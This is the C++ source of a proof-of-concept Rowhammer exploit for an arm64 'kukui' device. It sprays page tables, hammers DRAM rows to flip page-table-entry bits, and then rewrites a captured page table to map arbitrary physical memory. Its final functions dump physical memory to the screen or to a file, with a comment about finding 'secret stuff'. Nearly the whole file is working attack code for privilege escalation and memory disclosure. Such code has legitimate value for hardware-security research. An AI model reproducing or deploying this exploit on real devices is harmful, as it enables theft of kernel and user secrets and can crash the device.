#ifndef _GNU_SOURCE
  #define _GNU_SOURCE
#endif

/**
 * This is the first poc of a rowhammer exploit on a kukui arm64 device.
 * 
 * It can use bit flip simulation through /dev/mem for faster development and
 * pteditor to get uncachable memory for real rowhammering.
 * For pteditor to work, the pteditor kernel module must be installed:
 *   https://github.com/misc0110/PTEditor/
 *  
 */

#include <algorithm>
#include <iostream>
#include <ctime>
#include <cerrno>
#include <cassert>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <fcntl.h>
#include <stdlib.h>
#include <sched.h>
#include <thread>
#include <unistd.h>
#include <math.h>
#include <climits>
#include <signal.h>
#include <execinfo.h>
#include <linux/perf_event.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <asm/unistd.h>

#include "globals.h"
#include "utils.h"
#include "memory.h"
#include "spray_children.h"



// Which bit in the 64-bit PTE to flip.
const int g_test_bit_to_flip = 8 + 12; // Bit 8 in the physical page number.

uintptr_t g_victim_phys_addr;
uint64_t *g_filler_mem;

int g_flip_offset = 0;

int g_temp_file_fd;
size_t g_file_size;

int g_spraying_pagetables = 0;

uint8_t *g_aggr[4];

uint64_t *g_shared_page;
int g_flush_step = 7577;

int g_child_id = 0;
const int g_child_count = 1;
int g_child_pids[1];;
int g_write_pipes[1][2];
int g_read_pipes[1][2];

void **g_file_mappings;

FILE *g_output_file = nullptr;

int g_found_flip = 0;


int hammer_victim(int simulate, volatile uint8_t *aggr[4],
                   uint8_t pattern, int try_pattern) {

  uint64_t victim_value;

  // hammer the victim
  if (simulate) {
#ifdef SIMULATE
  #warning Running in Rowhammer simulation mode
#endif
    int hammered_page_table = 0;
    victim_value = read_physical_mem(g_victim_phys_addr);
    if ((victim_value & 0xFF) == 0xD3) {
      printf("victim content: %lx\n", victim_value);
      uint64_t paddr = (victim_value & 0x00000FFFFFFFF000);
      printf(COLOR_RED "pointing to" COLOR_RESET " %lx\n", paddr);
      printf("content: %lx \n", read_physical_mem(paddr));
    }
    else {
      // only flip bits if it is a page table
      return 0;
    }

    for (int test_bit_to_flip = g_test_bit_to_flip; test_bit_to_flip < 30; test_bit_to_flip++) {
      uint64_t changed_value = flip_bit(g_victim_phys_addr, test_bit_to_flip);
      if((changed_value & 0xFF) == 0xD3) {
        uint64_t paddr = changed_value & 0x00000FFFFFFFF000;
        printf("probably changed a page table\n");
        printf("pointing to %lx\n", paddr);
        uint64_t content = read_physical_mem(paddr);
        printf("content: %lx\n", content);
        if ((content & 0xFF) == 0xD3) {
          printf("pointing to a page table \\o/\n");
          hammered_page_table = 1;
          break;
        }
      }
      else {
        printf("probably didn't flip a page table\n");
      }
      flip_bit(g_victim_phys_addr, test_bit_to_flip);
    }

    return hammered_page_table;
  }
  else {
    uint64_t buffer[0x1000];

    make_uncacheable((uint8_t*) aggr[0], 0x1000, 0);
    make_uncacheable((uint8_t*) aggr[1], 0x1000, 0);
    make_uncacheable((uint8_t*) aggr[2], 0x1000, 0);
    make_uncacheable((uint8_t*) aggr[3], 0x1000, 0);

#ifdef DEBUG
    for (int i=0; i < 512; i++) {
      buffer[i] = read_physical_mem(g_victim_phys_addr + i * 8);
    }

    int rn[] = {get_row_number(get_ppn((uintptr_t) aggr[2]) << 12),
                get_row_number(get_ppn((uintptr_t) aggr[0]) << 12),
                get_row_number(g_victim_phys_addr),
                get_row_number(get_ppn((uintptr_t) aggr[1]) << 12),
                get_row_number(get_ppn((uintptr_t) aggr[3]) << 12)};

    if ((rn[0] + 1 != rn[1]) ||
        (rn[0] + 2 != rn[2]) ||
        (rn[0] + 3 != rn[3]) ||
        (rn[0] + 4 != rn[4])) {
          return 0;
        }

    printf("hammer with aggressors: 0x%lx 0x%lx [0x%lx] 0x%lx 0x%lx | %d %d %d %d %d\n", 
            get_ppn((uintptr_t) aggr[2]) << 12, get_ppn((uintptr_t) aggr[0]) << 12,
            g_victim_phys_addr,
            get_ppn((uintptr_t) aggr[1]) << 12, get_ppn((uintptr_t) aggr[3]) << 12,
            rn[0], rn[1], rn[2], rn[3], rn[4]);
#endif

    sleep(1);

    for (int j = 0; j < 3; ++j) {

      uint64_t val;
      for (int k = 0; k < 0x1000 / sizeof(uint64_t); k++) {
        if (j == 0) {
          val = 0x0068000AAAAAAFD3;
        }
        else if (j == 1) {
          val = 0x0068000555555FD3;
        }
        else {
          val = ((uint64_t) rand() * rand()) & 0x00000FFFFFFFF000;
        }

        if (check_address(((volatile uint64_t*) aggr[0])) ||
            check_address(((volatile uint64_t*) aggr[1])) ||
            check_address(((volatile uint64_t*) aggr[2])) ||
            check_address(((volatile uint64_t*) aggr[3])))
            continue;

        ((uint64_t*) aggr[0])[k] = val;
        ((uint64_t*) aggr[1])[k] = val;
        ((uint64_t*) aggr[2])[k] = val;
        ((uint64_t*) aggr[3])[k] = val;
      }

      for (int k = 0; k < 512; k++) {
        flush(((uint64_t*) aggr[0]) + k);
        flush(((uint64_t*) aggr[1]) + k);
        flush(((uint64_t*) aggr[2]) + k);
        flush(((uint64_t*) aggr[3]) + k);
      }

      uint64_t start = ns();
      // hammer
      for (int loops = 0; loops < 10000000; ++loops) {
        *(aggr[2]);
        *(aggr[3]);
        isb();
        #ifdef FLUSH
        flush((void*) aggr[2]);
        flush((void*) aggr[3]);
        #endif
      }
      uint64_t duration = ns() - start;
      printf("took %ldus, found_flip: %d\n", duration / 1000, g_found_flip);
    }

#ifndef __ANDROID__
#ifdef DEBUG
    for (int i=0; i < 512; i++) {
      /*if (i == (g_flip_offset / 8)) {
        printf(COLOR_CYAN);
      }*/
      uint64_t victim_value = read_physical_mem(g_victim_phys_addr + i * 8);

      if (victim_value != buffer[i]) {
        printf(COLOR_RED "Found bit flip! " COLOR_RESET "   %16lx  ###############################################\n"
               "                != %16lx\n", buffer[i], victim_value);
        g_found_flip++;

        if ((victim_value & 0xFFFF00000000FFUL) == 0x680000000000D3UL) {
          uint64_t paddr = (victim_value & 0x00000FFFFFFFF000UL);
          uint64_t content = read_physical_mem(paddr);

          printf("victim content: " COLOR_CYAN " %16lx  ", victim_value);
          printf(COLOR_RED "pointing to" COLOR_RESET " %lx  ", paddr);
          printf("content: %lx \n", content);
        }
      }
      printf(COLOR_RESET);
    }
#endif
#endif
  }

  return 0;
}


int spray_page_tables(int iterations) {
  // and now map the file very often and hope that a page table is put in our victim page
  int iteration;

  int victim_ptes = 0;

  int low = 0, unique_low = 0;
  int mid = 0;
  int high = 0, unique_high = 0;

  int low_min = 0x70000, low_max = 0;
  int high_min = 0x10000000, high_max = 0;

  uint32_t *unique_low_list = (uint32_t*) calloc(0x70000, sizeof(uint32_t));
  uint32_t *unique_high_list = (uint32_t*) calloc(0x200000 - 0x100000, sizeof(uint32_t));

  if (unique_low_list == nullptr || unique_high_list == nullptr) {
    printf(COLOR_GREEN "C%d" COLOR_RESET " couldn't get memory for unique lists\n", g_child_id);
    return 0;
  }

  printf(COLOR_GREEN "C%d" COLOR_RESET " victim: %lx\n", g_child_id,
         g_victim_phys_addr / 0x1000);

  if (g_child_id != 0) {
    g_file_mappings = (void**) malloc(iterations * sizeof(void*));
    if (g_file_mappings == nullptr) {
      printf(COLOR_GREEN "C%d" COLOR_RESET " couldn't get memory for file mappings\n", g_child_id);
      return 0;
    }
  }

  g_spraying_pagetables = 1;

  uint64_t xor_ = 0;

  for (int i = (g_child_id == 0) ? 1 : 0; i < iterations && g_spraying_pagetables; i++) {
    iteration = i;

    g_file_mappings[i] = mmap(NULL, g_file_size,  PROT_READ | PROT_WRITE, 
                              MAP_SHARED, g_temp_file_fd, 0);

    if (g_file_mappings[i] == MAP_FAILED) {
      if (i < 10) {
        printf(COLOR_GREEN "C%d" COLOR_RESET " mmaping failed %d %s %d %ld\n", g_child_id, errno, strerror(errno),
              g_temp_file_fd, g_file_size);
      }
      iteration--;
      break;
    }

    int pfn, prev_pfn = 0;

    for (size_t j = 0; j < g_file_size / 8; j += 0x1000 / 8) {
      xor_ ^= ((volatile uint64_t*) (g_file_mappings[i]))[j];

      if (g_child_id == 0) {
#ifndef __ANDROID__
#ifdef DEBUG
        pfn = get_pmd_pfn((void*) &(((uint64_t*) (g_file_mappings[i]))[j]));
        if (pfn != prev_pfn) {
          fprintf(g_output_file, "%d,%d,%d,0\n", 0, 0, pfn);     
          prev_pfn = pfn;
        }
#endif
#endif
      }
    }
    
    if (i % 5000 == 0) {
      printf(COLOR_GREEN "C%d" COLOR_RESET " %d\n", g_child_id, i);

      if (g_child_id == 0) {
        //grep("/proc/meminfo", "PageTables");
      }
      else {
#ifndef __ANDROID__
#ifdef DEBUG
        sleep(2);
#endif
#endif
      }
    }
  }

  printf("%lx\n", xor_);
  g_spraying_pagetables = 0;

  return iteration;
}


void flush_tlb(int iterations, int step, bool safe) {
  // flush the tlb
  bool use_safety_child = false;

  for (int k = 0; k < iterations; k += step) {
#ifdef USE_VFORK
    if (!safe) {
      use_safety_child = 
        check_address_range((volatile uint64_t *) g_file_mappings[k], g_file_size);
    }

    for (size_t j = 0; j < g_file_size / sizeof(uint64_t); j += 0x1000 / sizeof(uint64_t)) {
      if (use_safety_child && check_address(&(((uint64_t*) (g_file_mappings[k]))[j]))) {
        continue;
      }
      ((volatile uint64_t*) (g_file_mappings[k]))[j];
    }
#else
    for (size_t j = 0; j < g_file_size / sizeof(uint64_t); j += 0x1000 / sizeof(uint64_t)) {
      if (!safe && (j / (0x1000 / sizeof(uint64_t))) % 5 == 0) {
        use_safety_child = 
          check_address_range(&(((uint64_t*) (g_file_mappings[k]))[j]), 5 * 0x1000);
      }
      if (use_safety_child && check_address(&(((uint64_t*) (g_file_mappings[k]))[j]))) {
        continue;
      }
      ((volatile uint64_t*) (g_file_mappings[k]))[j];
    }
#endif
  }
}



struct Hammer_thread_data {
  int simulate;
  std::vector<std::vector<uint8_t*>> &rows_vector;
  std::vector<uintptr_t> &victim_positions;
  bool run, done;

  Hammer_thread_data(int _simulate,
                     std::vector<std::vector<uint8_t*>> &_rows_vector,
                     std::vector<uintptr_t> &_victim_positions) : 
                     simulate(_simulate),
                     rows_vector(_rows_vector),
                     victim_positions(_victim_positions),
                     run(false), done(false) {}
};

void hammer_thread_function(Hammer_thread_data &data) {
  int j = 0;
  int tries = 0;

  int simulate = data.simulate;
  std::vector<std::vector<uint8_t*>> &rows_vector = data.rows_vector;
  std::vector<uintptr_t> &victim_positions = data.victim_positions;

  // wait for the signal to start hammering
  while(!data.run) {
    sleep(1);
  }

  setcpu(7);

  for (auto &rows : rows_vector) {
    printf("\n%d / %ld\n", j, rows_vector.size());

    for (int i = 2; i < rows.size() - 2; i += 3) {
      volatile uint8_t *aggr[4];

      aggr[0] = rows.at(i - 1);
      aggr[1] = rows.at(i + 1);
      aggr[2] = rows.at(i - 2);
      aggr[3] = rows.at(i + 2);

      // the victim rows contain physical addresses (only for debugging)
      g_victim_phys_addr = (uintptr_t) rows[i];

#ifdef DEBUG
      // hammer only the victims where we know that they contain a page table
      // this is a shortcut that is saving time, used for testing
      if (std::find(victim_positions.begin(), victim_positions.end(), (uintptr_t) rows[i]) != victim_positions.end())
      {
        uint64_t victim_value = read_physical_mem((uintptr_t) rows[i]);
        printf("%p: %lx\n", rows[i], victim_value);

        hammer_victim(simulate, aggr, 0);
        printf("\r  %d / %ld  ", i, rows.size());

        tries++;
      }
      else {
        printf("\r  %d / %ld  ", i, rows.size());
        flush(stdout);
      }
#else
      hammer_victim(simulate, aggr, 0);
      printf("\r  %d / %ld  ", i, rows.size());
      tries++;

      sleep(1);
#endif

#ifdef SIMULATE
      if (tries >= 2 || !data.run) {
        break;
      }
    }

    if (tries >= 2 || !data.run) {
      break;
    }
#else
      if (!data.run) {
        break;
      }

    }
#endif

    if (!data.run) {
      break;
    }
    j++;
  }
  printf("\n");
  printf("hammering done\n");

  data.done = true;
}


void check_mappings(int iterations, uint64_t **page_table, void **virtual_target, char quiet) {
  int found_page_table = 0;
  *page_table = nullptr;
  *virtual_target = nullptr;

  int inaccessible = 0;
  int accessible = 0;

  // go through all file mappings
  for (int i = 0; i < iterations && !(*page_table); i++) {
    uint64_t id = 0x1234567800000000;

#ifdef USE_VFORK
    bool use_safety_child = 
      check_address_range((volatile uint64_t *) g_file_mappings[i], g_file_size);
#else
    bool use_safety_child = false;
#endif
    for (int j = 0; j < g_file_size  / sizeof(uint64_t); j += 0x1000 / 8, id += 0x1000 / sizeof(uint64_t)) {
#ifdef USE_VFORK
      if (use_safety_child && check_address(&(((uint64_t*) (g_file_mappings[i]))[j]))) {
        printf(COLOR_GREEN "C%d" COLOR_RESET " found inaccessible page\n", g_child_id);
        continue;
      }
#else
      if ((j / (0x1000 / sizeof(uint64_t))) % 1 == 0) {
        use_safety_child = 
          check_address_range(&(((uint64_t*) (g_file_mappings[i]))[j]), 1 * 0x1000);
      }
      if (use_safety_child) {
        inaccessible++;
        continue;
      }
      /*if (use_safety_child && check_address(&(((uint64_t*) (g_file_mappings[i]))[j]))) {
        //printf(COLOR_GREEN "C%d" COLOR_RESET " found inaccessible page\n", g_child_id);
        inaccessible++;
        continue;
      }*/
      accessible++;
#endif

      uint64_t val = ((uint64_t*) (g_file_mappings[i]))[j];

      // we know that it should contain the value id. If it does not, the page
      // table was changed and points somewhere else
      if (val != id) {
        // simple check if it is a page table
        if ((val & 0xFF) == 0xD3) {
          printf(COLOR_GREEN "C%d" COLOR_RESET " FOUND A PAGE TABLE val = %lx\n", g_child_id, val);

          *page_table = &(((uint64_t*) (g_file_mappings[i]))[j]);
          
          for(int k = 0; k < 512; k++) {
            printf("  %3d %lx ", k, (*page_table)[k]);
            
            uint64_t paddr = ((*page_table)[k] & 0x00000FFFFFFFF000);
            printf(COLOR_RED "pointing to" COLOR_RESET " %lx  ", paddr);
#ifdef DEBUG
            printf("content: %lx \n", read_physical_mem(paddr));
#else
            printf("\n");
#endif
          }

          break;
        }
        else if ((val & 0xFFFFFFFF00000000) == 0x1234567800000000) {
          printf(COLOR_GREEN "C%d" COLOR_RESET " Found another shared mem page\n", g_child_id);
          printf("%lx != %lx\n", val, id);
          printf("We have to unmap it and put a page table there, "
                 "then hammer again\n");
          *virtual_target = (void*) &(((uint64_t*) (g_file_mappings[i]))[j]);
          break;
        }
        else {
          printf(COLOR_GREEN "C%d" COLOR_RESET " Found something else\n", g_child_id);
          printf("%lx\n", val);
          break;
        }
      }
    }

    if (i % 1000 == 0 && quiet == '\0') {
      printf(COLOR_GREEN "C%d" COLOR_RESET " %d / %d", g_child_id, i, iterations);
#ifdef USE_VFORK
      printf("\n");
#else
      printf(" accessible: %d, inaccessible: %d\n", accessible, inaccessible);
#endif
    }
  }

}


int hammer_and_check(std::thread &thread, Hammer_thread_data &thread_data,
                     int simulate, std::vector<std::vector<uint8_t*>> &rows_vector,
                     char *pipe_buf, int iterations, uint64_t **page_table, void **virtual_target,
                     std::vector<uintptr_t> &victim_positions) {

  if (simulate) {
    // if we simulate the hammering, we don't have hammer in a thread.
    thread_data.run = true;
    hammer_thread_function(thread_data);

    printf("Check mappings\n");
    strcpy(pipe_buf, "check");
    write_to_children(pipe_buf, 6);

    check_mappings(iterations, page_table, virtual_target, '\0');

    printf("Waiting for children\n");
    wait_for_children(pipe_buf, PIPE_BUF);

    if(strcmp(pipe_buf, "done1") == 0) {
      return 2;
    }

    return 0;
  }

  // start a threat that does the hammering and check our mappings in parallel
  thread_data.run = true;

  printf("check mappings\n");

  bool final_check_done = false;

  while (!final_check_done) {
    if (thread_data.done)
      final_check_done = true;

    strcpy(pipe_buf, "checkq");
    write_to_children(pipe_buf, 6);

    check_mappings(iterations, page_table, virtual_target, 'q');

    printf(COLOR_GREEN "C%d" COLOR_RESET " check_mappings done %p %p\n",
            g_child_id, *page_table, *virtual_target);

    wait_for_children(pipe_buf, PIPE_BUF);

    sleep(120);

    if (*page_table != nullptr || strcmp(pipe_buf, "done1") == 0) {
      thread_data.run = false;
      break;
    }

    printf("recheck mappings\n");
  }

  if (*page_table != nullptr) {
    return 1;
  }

  if(strcmp(pipe_buf, "done1") == 0) {
    return 2;
  }

  return 0;
}


uint64_t *find_access_address(uint64_t *page_table, int iterations) {
  uint64_t *access_address = nullptr;

  flush_tlb(iterations);

  printf(COLOR_GREEN "C%d" COLOR_RESET " search through shared memory file\n", g_child_id);
  for (int i = 0; i < iterations && access_address == nullptr; i++) {

#ifdef USE_VFORK
    bool use_safety_child = 
      check_address_range((volatile uint64_t *) g_file_mappings[i], g_file_size);
#else
    bool use_safety_child = false;
#endif

    for (size_t j = 0; j < g_file_size / sizeof(uint64_t); j += 0x1000 / sizeof(uint64_t)) {
#ifdef USE_VFORK
      if (use_safety_child && check_address(&(((uint64_t*) (g_file_mappings[i]))[j]))) {
        printf(COLOR_GREEN "C%d" COLOR_RESET " found inaccessible page\n", g_child_id);
        continue;
      }
#else
      if ((j / (0x1000 / sizeof(uint64_t))) % 5 == 0) {
        use_safety_child = 
          check_address_range(&(((uint64_t*) (g_file_mappings[i]))[j]), 5 * 0x1000);
      }
      if (use_safety_child && check_address(&(((uint64_t*) (g_file_mappings[i]))[j]))) {
        //printf(COLOR_GREEN "C%d" COLOR_RESET " found inaccessible page\n", g_child_id);
        continue;
      }
#endif

      uint64_t val = ((uint64_t*) (g_file_mappings[i]))[j];
      uint64_t valp1;

      if (j < (g_file_size - 0x1000) / sizeof(uint64_t)) {
        valp1 = ((uint64_t*) (g_file_mappings[i]))[j + 0x1000 / 8];
      }
      else if (i < iterations - 1) {
        valp1 = ((uint64_t*) (g_file_mappings[i + 1]))[0];
      }
      else {
        break;
      }

      if (val == valp1) {
        access_address = &(((uint64_t*) (g_file_mappings[i]))[j]);

        printf(COLOR_GREEN "C%d" COLOR_RESET " FOUND THE CORRESPONDING VIRTUAL ADDRESS \\o/ %p\n"
                "%lx == %lx\n", g_child_id, access_address, val, valp1);

        break;
      }
    }
  }

  // if we found the address that corresponds to our changed page table entry
  // change the pte again to verify that it is really working
  if (access_address && page_table) {
    //uint64_t tmp;
    printf("access_address: %p, page_table: %p\n", access_address, page_table);

    printf("trying to change the pte again\n");
    page_table[0] = page_table[2];

    printf("reading virtual address again\n");
    flush_tlb(iterations);
    printf("%lx == %lx\n", access_address[0], access_address[2 * 0x1000 / 8]);
    
    volatile uint64_t tmp = 0x9a9a9a9a9a9a9a9aUL;
    volatile uint64_t tmp2 = 0x9a9a9a9a9a9a9a9aUL;

    uint64_t ppn = get_ppn((uintptr_t) &tmp);

    printf("pte: %lx, ppn: %lx\n", page_table[0], ppn);
    page_table[0] = (page_table[0] & 0xFFF00000000FFFUL) + (ppn << 12);
    printf("pte: %lx\n", page_table[0]);

    flush_tlb(iterations, g_flush_step);

    for (int i = 0; i < 512; i++) {
      if(access_address[i] == 0x9a9a9a9a9a9a9a9aUL) {
        printf("it works \\o/\n");
      }
    }

    page_table[0] = (page_table[0] & 0xFFF00000000FFFUL) + (0x11b52eUL << 12);
    flush_tlb(iterations);

    printf("done\n");
  }

  return access_address;
}


void dump_memory_to_screen(volatile uint64_t *access_address, uint64_t *page_table, int iterations) {
  access_address = (volatile uint64_t*) ((uintptr_t) access_address & ~(0x200000UL - 1));

  printf("access address: %p, page table: %p\n", access_address, page_table);

  printf("Dump of the first three physical pages not containing only 0s:\n");

  int printed_pages = 0;

  // dump the first two pages that are not only 0
  for (size_t i = 0x40000; i < 0x140000;) {
    // set the 512 page table entries
    for (int j = 0; j < 512; j++, i++) {
      page_table[j] = (page_table[j] & 0xF0000000000FFFUL) + (i << 12);
    }

    flush_tlb(iterations, g_flush_step);

    for (int j = 0; j < 512; j++) {
      int zeros = 0;
      for (int k = 0; k < 0x1000 / sizeof(uint64_t); k++) {
        if(access_address[j * 0x1000 / sizeof(uint64_t) + k] == 0)
          zeros++;
      }

      if (zeros < 256) {
        printf("Address: 0x%lx\n", (i - 512 + j) * 0x1000);
        for (int k = 0; k < 0x1000 / sizeof(uint64_t); k++) {
          printf("%016lx", access_address[j * 0x1000 / sizeof(uint64_t) + k]);

          if ((k + 1) % 8 == 0) {
            printf("\n");
          }
        }
        printed_pages++;

        if (printed_pages == 3) {
          return;
        }
      }
    }
  }
}

// see void dump_memory(...)
void dump_memory_to_file(volatile uint64_t *access_address, uint64_t *page_table, int iterations) {
  ssize_t ret, written;
  const char *memory_dump_file_path = "/mnt/data/memory.dump";

  uint8_t *zero_page = (uint8_t*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
  memset(zero_page, 0, 0x1000);

  uint8_t *buffer = (uint8_t*) mmap(NULL, 0x200000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

  printf(COLOR_GREEN "C%d " COLOR_RESET " Let's dump the whole memory and find some secret stuff\n", g_child_id);
  printf(COLOR_GREEN "C%d " COLOR_RESET " Output file: %p %s\n", g_child_id, buffer, memory_dump_file_path);

  int dump_file = open(memory_dump_file_path, O_RDWR | O_CREAT | O_SYNC | O_DIRECT, S_IRWXU);

  if (dump_file == -1) {
    printf("couldn't open dump file %d %s\n", errno, strerror(errno));
    return;
  }

  access_address = (volatile uint64_t*) ((uintptr_t) access_address & ~(0x200000UL - 1));

  printf("access address: %p, page table: %p, dump file: %d\n",
         access_address, page_table, dump_file);

  uint64_t start_time = ns();

  for (size_t i = 0x40000; i < 0x140000;) {
    // set the 512 page table entries
    for (int j = 0; j < 512; j++, i++) {
      page_table[j] = (page_table[j] & 0xF0000000000FFFUL) + (i << 12);
    }

    flush_tlb(iterations, g_flush_step);

    memcpy (buffer, (const void*) access_address, 0x200000);

    written = 0;
    int retry_counter = 0;
    do {
      ret = write(dump_file, buffer + written, 0x200000 - written);
      if (ret == -1 || ret == 0) {
        printf("Couldn't write into dump file %ld %d %s\n", ret, errno, strerror(errno));

        if (errno == 12 && retry_counter < 3) {
          sleep(1); // the problem will erase itself;
          retry_counter++;
          continue;
        }
        else {
          break;
        }
      }
      written += ret;
    } while (written < 0x200000);

    //sleep(1);

    if (i % 512 * 5000 == 0) {
      printf("\rdumped %ld / %d pages   ", i - 0x40000, 0x140000 - 0x40000);
      fflush(stdout);
    }
  }
  uint64_t duration = ns() - start_time;

  printf("\nmemory dumped\ntook %ld ms\n", duration / (1000UL * 1000));
}


// This is the final function called if the exploit was successful.
void dump_memory(volatile uint64_t *access_address, uint64_t *page_table, int iterations, bool screen) {
  if (screen) {
    dump_memory_to_screen(access_address, page_table, iterations);
  }
  else {
    dump_memory_to_file(access_address, page_table, iterations);
  }
  printf("Now the device will probably crash, could be avoided with proper page table cleanup\n");
}


#ifdef __ANDROID__
int exploit(volatile uint8_t *mem, size_t mem_size, char *shared_file_fd_s)
#else
int exploit(volatile uint8_t *mem, size_t mem_size)
#endif
{
  int re;
  int simulate = 0;

  std::vector<std::vector<uint8_t*>> rows_vector;

#ifdef SIMULATE
  simulate = 1;
#endif


  printf("Search for contiguous memory areas\n");

  // Get contiguous memory by using the patterns side channel
  int contiguous_rows_count = get_rows_vector(rows_vector, mem, mem_size, -1);
  if (contiguous_rows_count == 0)
  {
    printf("Couldn't find contiguous memory areas\n");
    return 0;
  }
  if (contiguous_rows_count < 1000)
  {
    printf("Found only a small number of contiguous rows. Please start the exploit again.\n");
    return 0;
  }
  
  size_t page_table_size = 0x30000000 / (g_child_count + 1);

  // - Seaborn
  // Choose a file size.  We want to pick a small value so as not to
  // waste memory on data pages that could be used for page tables
  // instead.  However, if we make the size too small, we'd have to
  // create too many VMAs to generate our target quantity of page
  // tables.
  // On our ARM64 the virtual address space is only 512GB.
  const size_t max_vmas = (1 << 16) - 50;
  size_t target_pt_size;
  size_t target_mapping_size;
  size_t iterations;
  g_file_size = 0x200000;

  for (;;) {
    // Size in bytes of page tables we're aiming to create.
    target_pt_size = page_table_size - g_file_size;
    // Number of 4k page table pages we're aiming to create.
    target_mapping_size = target_pt_size * 512;
    // Number of VMAs we will create.
    iterations = target_mapping_size / g_file_size;
    if (iterations < max_vmas)
      break;
    g_file_size *= 2;
  }

  printf("g_file_size=%zi MB\n", g_file_size >> 20);
  printf("iterations=%zi\n", iterations);
  
  // If the temp file lives on a disc-backed filesystem, we are liable
  // to get its pages mapped via read-only PTEs. Using tmpfs, which
  // is in-memory-only, avoids that problem.
#ifndef __ANDROID__
  const char *temp_file = "/dev/shm/temp_file_for_rowhammer_exploit";

  g_temp_file_fd = open(temp_file, O_CREAT | O_RDWR, 0666);
  if (g_temp_file_fd < 0) {
    printf("Couldn't open temp_file %d %s\n", errno, strerror(errno));
    return errno;
  }
  re = ftruncate(g_temp_file_fd, g_file_size);
  if (re != 0) {
    printf("Couldn't ftruncate temp_file %d %s\n", errno, strerror(errno));
    return errno;
  }
#else
  g_temp_file_fd = atoi(shared_file_fd_s);
#endif

  g_file_mappings = (void**) malloc(iterations * sizeof(void*));

  // map the file once
  g_file_mappings[0] = mmap(NULL, g_file_size,  PROT_READ | PROT_WRITE, 
                            MAP_SHARED, g_temp_file_fd, 0);
  
  // make sure that we don't get huge pages
  madvise(g_file_mappings[0], g_file_size, MADV_NOHUGEPAGE);

  // populate the pages
  uint64_t id = 0x1234567800000000;
  for (size_t i = 0; i < g_file_size / 8; i++, id++) {
    ((uint64_t*) (g_file_mappings[0]))[i] = id;
  }

  printf("populated pages\nunmapping victim pages\n");

  // go through rows_vector and unmap victim rows
  //
  // 0 
  // 1 
  // 2 <-- free
  // 3 
  // 4 
  // 5 <-- free
  // 6 
  // 7 
  // 8 <-- free
  // 9

  std::vector<uint8_t*> freed_rows;

  for (int j = 0; j < rows_vector.size(); j++) {
    auto &rows = rows_vector[j];
    bool remove_rows = false;

    for (int i = 0; i < rows.size(); i++) {
      if (std::find(freed_rows.begin(), freed_rows.end(), rows[i]) != freed_rows.end()//
           || (*(rows[i]) & 0xFFFFFFFF00000000) == 0xdeadbeef00000000)
      {
        // we have been here already. we probably found this area twice
        remove_rows = true;
        break;
      }

      mlock(rows[i], 0x1000);
      ((uint64_t*) (rows[i]))[0] = 0xdeadbeef00000000 + i;
      ((uint64_t*) (rows[i]))[1] = get_ppn((uintptr_t) rows[i]);

      fprintf(g_output_file, "3,3,%ld,0\n", get_ppn((uintptr_t) rows[i]));
    }

    if (remove_rows) {
      printf("removing %d\n", j);
      rows_vector.erase(rows_vector.begin() + j);
      j--;
      continue;
    }
  }

  // unmap all other memory that is not contiguous
  for (size_t i = 0; i < mem_size; i += 0x1000) {
    if (( *((uint64_t*)(mem + i)) & 0xFFFFFFFF00000000) != 0xdeadbeef00000000) {
      munmap((void*) (mem + i), 0x1000);
    }
  }

  // unmap the victim pages
  for (int j = 0; j < rows_vector.size(); j++) {
    auto &rows = rows_vector[j];
    
    for (int i = 2; i < rows.size() - 2; i += 3) {
      if (std::find(freed_rows.begin(), freed_rows.end(), rows[i]) != freed_rows.end()) {
        printf("BUG: This is already freed %p %d %d\n", rows[i], i, j);
        rows[i] = NULL;
        continue;
      }

      uint8_t *addr = rows[i];
      *addr = 0;
      uintptr_t ppn = get_ppn((uintptr_t) rows[i]);
      munmap(rows[i], 0x1000);
      freed_rows.push_back(rows[i]);
      rows[i] = (uint8_t*) (ppn * 0x1000);

      fprintf(g_output_file, "6,6,%ld,0\n", ppn);
    }
  }


  // Start the hammer thread before spraying page tables
  std::vector<uintptr_t> victim_positions;

  auto thread_data = Hammer_thread_data(simulate, rows_vector, victim_positions);

  std::thread hammer_thread(hammer_thread_function, std::ref(thread_data));



  printf("spawn_spray_children\n");

  spawn_spray_children();

  sleep(1);

  // prepare "spray%amount%" for the children
  char pipe_buf[PIPE_BUF];
  strcpy(pipe_buf, "spray");
  *((int*) (pipe_buf + 6)) = iterations;

  printf("free ram: %'ld\n", get_free_mem());

  write_to_children(pipe_buf, 10);

  iterations = spray_page_tables(iterations);

  printf("Waiting for children\n");
  wait_for_children(pipe_buf, PIPE_BUF);

  //printf("free mem: %'ld\n", get_free_mem());


  int pt_counter = 0, row_idx = 0;
  uintptr_t first_find = 0;

#ifdef DEBUG
  for (auto &rows : rows_vector) {
    for (int i = 1; i < rows.size(); i++) {
      if ((i - 2) % 3 != 0) {
        fprintf(g_output_file, "%d,%d,%ld,0\n", 4, 4, get_ppn((uintptr_t) rows[i]));
      }
    }

    for (int i = 2; i < rows.size(); i += 3) {
      uint64_t victim_value = 0;

      if ((uintptr_t) rows[i] != 0) {
        victim_value = read_physical_mem((uintptr_t) rows[i]);
      }

      if ((victim_value & 0xF00000000000FFUL) == 0x600000000000D3UL) {
        fprintf(g_output_file, "%d,%d,%ld,%lx\n", 7, 8, (uintptr_t) rows[i] / 0x1000, victim_value);

        pt_counter++;
        victim_positions.push_back((uintptr_t) rows[i]);
        first_find = (uintptr_t) rows[i];

        if (victim_positions.size() < 10) {
          printf("content: %lx \n", victim_value);
          printf("%lx %d\n", (uintptr_t) rows[i], i);

          uint64_t neighbour = read_physical_mem(get_next_row((uintptr_t) rows[i]));
          printf("content: %lx\n", neighbour);
        }
      }
      else {
        fprintf(g_output_file, "%d,%d,%ld,%lx\n", 7, 7, (uintptr_t) rows[i] / 0x1000, victim_value);
      }
    }
    //if (victim_positions.size() > 10)
    //  break;

    row_idx++;
  }
  
  printf("\npt_counter: %d %lx\n", pt_counter, read_physical_mem(first_find));

  if (pt_counter == 0) {
    printf("The spraying put no page table into one of our victim rows.\n"
           "When running the exploit without root permissions we wouldn't\n"
           "know but we do and can therefore exit here to save time.\n"
           "Please start the exploit again.\n");
    write_to_children("exit", 4);
    return 0;
  }
#endif

  int pfn, prev_pfn = 0;

  sleep(2);

  uint64_t *page_table = nullptr;
  void *virtual_target = nullptr;
